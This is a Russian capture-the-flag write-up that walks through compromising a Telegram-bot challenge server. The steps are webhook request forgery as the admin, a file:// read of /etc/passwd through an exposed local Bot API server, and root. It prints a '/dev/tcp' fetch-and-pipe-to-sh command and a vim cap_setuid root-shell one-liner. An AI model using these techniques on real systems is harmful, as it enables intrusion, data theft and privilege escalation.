### TLDL
[get_user_password.py](get_user_password.py)

[get_user_username.py](get_user_username.py)

# user

1. На вход игроки получают ссылку на telegram бота (отдельного для каждой команды) и `nmap`-скан сервера со следующими открытыми портами:
- 8081
- 8080
- 80
- 22


2. Игроки исследуют бота и находят в нём ссылку на веб-интерфейс, в котором много данных о генераторе.
Внимательно изучая страничку игроки находят логи:

```shell
[2025-01-01 00:00:00] INFO Starting updater service...
[2025-01-01 00:00:05] INFO Updated generator data at 2025-01-01 00:00:05
[2025-01-01 00:00:15] INFO Updated generator data at 2025-01-01 00:00:15
[2025-01-01 00:00:25] INFO Webhook set to http://0.0.0.0:8080/webhook
[2025-01-01 00:00:25] INFO Using ADMIN_ID=6698983417
[2025-01-01 00:00:25] INFO Bot started successfully.
        \n[2025-12-17 13:09:32] INFO Updated generator data at 2025-12-17 13:09:32\n[2025-12-17 13:09:42] INFO Updated generator data at 2025-12-17 13:09:42
```

Откуда находят
- Telegram ID администратора - `ADMIN_ID=6698983417`
- Информацию про то, что бот работает в режиме вебхуков `Webhook set to http://0.0.0.0:8080/webhook`, порт вебхука и его путь

Кроме того, в исходном коде html находят закомментированный фрагмент:

```html
      <div class="col-md-5">
        <div class="card card-complex p-3">
          <h6>Инструменты диагностики</h6>
          <p class="muted-small squish dense">Встроенные команды АДМИНИСТРАТОРА:</p>
          <pre class="codeblock">
/promote user_id — Повысить пользователя до администратора (только админ)
/get_remote_pass — Вывести пароль для удалённого доступа (только админ)
          </pre>
        </div>
      </div>
```

Откуда узнают о админском режиме и админских командах

## user - 1

Игрок читает о том, как работают вебхуки в telegram-ботах и находит статью подобную https://core.telegram.org/bots/webhooks, где читает о схеме запросов и тд

На той же странице есть упоминание механизма проверки запросов к webhook через `secret_token`, который необязателен

Изучая открытый webhook-порт, игрок пробует посылать туда поддельные запросы и замечает, что поле `secret_token` при инициализации вебхука (https://core.telegram.org/bots/api#setwebhook) не задано, потому что бот не требует никакого секрета и спокойно принимает фейковые json о сообщениях и отвечает на них

Игрок пишет поддельный запрос от админа (его айди выше), получает роль администратора и паролья для удаленного доступа

Но всё ещё у игрока нет username для подключения...

## user - 2

Исследуя ещё один открытый порт игрок находит локальный `telegram-bot-api ` сервер (например его можно обнаружить, просто загуглив ошибку, которая выводится при заходе на главную страницу)

Изучая его возможности и отличия от основного (https://api.telegram.org), он находит основной репозиторий этого проекта, официальный, от Telegram: https://github.com/tdlib/telegram-bot-api

На главной странице в README.md сказано:

~~~
...
In the local mode the Bot API server allows to:
...
Upload files using their local path and the file URI scheme. <- 
...
~~~

И приложена ссылка на https://en.wikipedia.org/wiki/File_URI_scheme, где игрок узнает (или, надеюсь, вспоминает) про формат ссылок вида `file://path`

Неочевидная но очень милая уязвимость при открытии этого сервака наружу

После этого игрок пишет мини бота на любом ЯП, которого подключает к этому локальному серверу (для этого ничего не требуется, только ссылка) и получает возможность выгрузить любой файл с сервера запросом вида

```python
url = f"{LOCAL_BOT_API_URL}/bot{BOT_TOKEN}/sendDocument"

data = {
    "chat_id": CHAT_ID,
    "document": f"file://{FILE_PATH}"
}
```

где `BOT_TOKEN` - любой валидный токен от бота в ТГ

Так игрок достает файл `/etc/passwd` с машинки и узнает юзернейм от пользователя ssh, с которым пробует подключаться и получает `low-access` доступ до сервака

# root

Игрок исследует сервер и разворвачивает linpease через имеющиеся инструменты (отсутствуют `curl` и `wget` на машине), например, так:

На контролируемом хосте:
```shell
sudo nc -q 5 -lvnp 80 < linpeas.sh
```

На юзере решаемой машинки:
```shell
cat < /dev/tcp/<IP>/80 | sh
```

В выводе `linpeas` игрок находит строчки:

```
files with capabilities (limited to 50):
/usr/bin/vim.nox cap_setuid=ep
```

Гуглим возможности `vim` при наличии `cap_setuid`

Выполняем

```shell
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

И получаем рутовый доступ